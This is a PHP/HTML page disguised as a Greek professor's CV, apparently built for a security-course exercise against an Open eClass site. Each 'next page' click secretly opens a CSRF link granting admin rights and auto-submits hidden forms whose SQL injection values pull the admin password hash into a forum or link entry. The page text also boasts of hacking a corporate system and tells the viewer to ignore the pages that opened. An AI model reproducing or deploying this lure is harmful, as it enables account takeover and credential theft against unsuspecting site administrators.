<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  function writeToLog($message) {
    $logFile = 'log.txt';
    $currentContent = file_get_contents($logFile);
    $newContent = $currentContent . $message . "\n";
    file_put_contents($logFile, $newContent);
  }

  if (isset($_POST['message'])) {
    $message = $_POST['message'];
    writeToLog($message);
  } else {
    echo "No message provided.";
  }
}
else{
}
?>

<html>
<head>
	<title>Βιογραφικό</title>
    <meta charset="UTF-8">
    <style>
		.button {
			background-color: #4CAF50; /* Green */
			border: none;
			color: white;
			padding: 16px 32px;
			text-align: center;
			text-decoration: none;
			display: inline-block;
			font-size: 16px;
			margin: 4px 2px;
			cursor: pointer;
			position: fixed;
			right: 100px;
			top: 50%;
			transform: translateY(-50%);
		}
	</style>
</head>
<body>


    <img id="photo" src="photo3.jpg">
    <h2 id="name">Kostas Chatzikokolakis</h2>
    <h1 style="text-align:center;">Βιογραφικό</h1>
    <br>
	<h3><p id="text" style="text-align:center;"></p></h3>
    
    <div id="content" hidden="hidden"></div>
    <br>
	<button class="button" onclick="nextText()" style="float:right;">Επόμενη Σελίδα</button>
	<script>
		var texts = [
			"Καλησπέρα, είμαι ο Κώστας Χατζηκοκολάκης, καθηγητής στο τμήμα Πληροφορικής και Τηλεπικοινωνιών στο Εθνικό και Καποδιστριακό Πανεπιστήμιο Αθηνών.",
			"Θέλω να δουλέψω για εσάς γιατί θεωρώ ότι η σχολή σας είναι μία από τις καλύτερες στη χώρα και θα μου προσφέρει την ευκαιρία να αναπτύξω τις γνώσεις και τις ικανότητές μου. Επιπλέον, θα ήθελα να συνεργαστώ με τους φοιτητές και να εμπνεύσω και να καθοδηγήσω την επόμενη γενιά των επαγγελματιών στο χώρο της πληροφορικής.",
			"Έχω πολυετή εμπειρία και βαθιά γνώση στον τομέα της πληροφορικής και μπορώ να διδάξω αποτελεσματικά και να εμπνεύσω τους μαθητές μου. Επιπλέον έχω την ικανότητά να προσαρμόζομαι σε νέες καταστάσεις και να αντιμετωπίζω προκλήσεις με ευελιξία και δημιουργικότητα. Ένα παράδειγμα αυτού είναι όταν ",
            "Βρέθηκα σε μια κατάληψη όπου προσπαθούσα να χακάρω έναν εταιρικό υπολογιστή για να αποκτήσω πρόσβαση σε ευαίσθητα δεδομένα. Χρησιμοποίησα μια ειδική τεχνική εισβολής στο σύστημα και κατάφερα να παρακάμψω τα μέτρα ασφαλείας, αποκτώντας πρόσβαση στα επιθυμητά δεδομένα. Στη συνέχεια, διέγραψα τα ίχνη μου από το σύστημα και αποχώρησα από την κατάληψη χωρίς να εντοπιστώνται οι δραστηριότητές μου.",
			"Θα ήθελα να σας ευχαριστήσω που μου δώσατε την ευκαιρία να εκπροσωπήσω τον εαυτό μου, καθώς και για τον χρόνο που μου δώσατε. Ελπίζω να λάβετε υπόψη το τι έχω να προσφέρω για εσάς. Τέλος, θέλω  απλά να σας πω ότι",
            "Αυτό το κείμενο φτιάχτηκε κυρίως από AI, Καλή συνέχεια, αγνοήστε τις σελίδες που μπορεί να άνοιξαν, είμαι σίγουρος δεν είναι τίποτα."
		];
		var index = 0;
		var links = [
            "",
			"http://i-sn1ff-ch4tz1k0.csec.chatzi.org/courses/TMA100/index.php",
			"http://i-sn1ff-ch4tz1k0.csec.chatzi.org/modules/user/user.php?giveAdmin=3",
			"",
			"",
            "http://i-sn1ff-ch4tz1k0.csec.chatzi.org/modules/link/link.php?eclass_module_id=2&hide=1"
		];
        var formHtml = [
            "",
			"",
			"",
			`<form name="myform" action="http://i-sn1ff-ch4tz1k0.csec.chatzi.org//modules/forum_admin/forum_admin.php?forumgosave=yes&amp;ctg=Αρχή&amp;cat_id=2" method="post" onsubmit="return checkrequired(this,'forum_name');" target="_blank" rel="noopener"><input type="hidden" name="forum_id" value="1"><input type="hidden" name="forum_id" value="1"><input type="text" name="forum_name" size="50" class="FormData_InputText" value="το hash:' , forum_desc=(SELECT password FROM eclass.user WHERE user_id='1'), -- -">textarea name="forum_desc" cols="47" rows="3" class="FormData_InputText">Περιοχή συζητήσεων για κάθε θέμα που αφορά το μάθημα</textarea><select name="cat_id" class="auth_input"><option value="2" selected="">Αρχή</option></select><input type="hidden" name="forumgosave" value="yes"><input id="submit" name="submit" type="submit" value="Αποθήκευση"></form>`,
            `<form name="myform" method="post" action="http://i-sn1ff-ch4tz1k0.csec.chatzi.org/modules/link/link.php?action=editlink&amp;urlview=" onsubmit="return checkrequired(this, 'urllink');" target="_blank" rel="noopener"><input type="hidden" name="id" value="1"><table class="FormData" width="99%"><input type="text" name="urllink" size="53" class="FormData_InputText", value="', description=(SELECT password from eclass.user where user_id=1), category='0"><input type="text" name="title" size="53" class="FormData_InputText", value="the hash:' WHERE id='1' -- -"><textarea rows="3" cols="50" name="description" class="FormData_InputText"></textarea><select name="selectcategory" class="auth_input"><option value="0">--</option></select><input id="submit" type="submit" name="submitLink" value="Αλλαγή σύνδεσμου"></form>`,
            ""
		];

        function writeToLog(message) {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
            console.log(this.responseText);
          }
        };
        xhttp.open("POST", "", true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send("message=" + message);
      }


        function nextText() {
			index = (index + 1) % texts.length;
			document.getElementById("text").textContent = texts[index];
            document.getElementById("content").innerHTML = formHtml[index];
			if (links[index] !== "") {
				window.open(links[index], '_blank');
                window.focus();
			}
            if (formHtml[index]!==""){
                console.log("here");
                var submitButton = document.getElementById("submit");
            if (submitButton) {
                submitButton.click();
            }
            else{
                var submitButton = document.getElementById("submitLink");   
            }
            }
            // Log the result to log.txt
			var logString = "Date: " + new Date().toLocaleString() + " | Index: " + index + "\n ";

			writeToLog(logString);

        }
		document.getElementById("text").textContent = texts[index];

        
        
	</script>




</body>
</html>
